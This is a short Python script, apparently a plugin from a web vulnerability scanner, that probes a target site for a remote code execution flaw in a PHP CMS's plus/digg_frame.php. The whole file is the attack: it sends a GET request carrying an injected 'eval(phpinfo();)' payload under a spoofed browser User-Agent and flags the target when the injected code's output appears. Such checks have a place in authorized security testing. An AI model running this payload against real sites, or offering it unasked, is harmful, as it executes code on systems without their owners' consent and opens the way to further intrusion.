import requests
from termcolor import cprint


class dig_frame_rce:

    def __init__(self,url):
        self.url = url

    def checktrace(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/plus/digg_frame.php?action=good&id=1024%651024&mid=*/eval(phpinfo(););var_dump(3);?>"
        if '://' not in self.url:
            self.url = 'http://' + self.url + '/'
        url = self.url
        vulnurl = url + payload

        try:
            r = requests.get(url=vulnurl,headers=headers)
            if r.status_code == 200 and "phpinfo" in r.content:
                cprint("target may be have digg_frame.php  rce:" + vulnurl,"red")
        except:
            return False
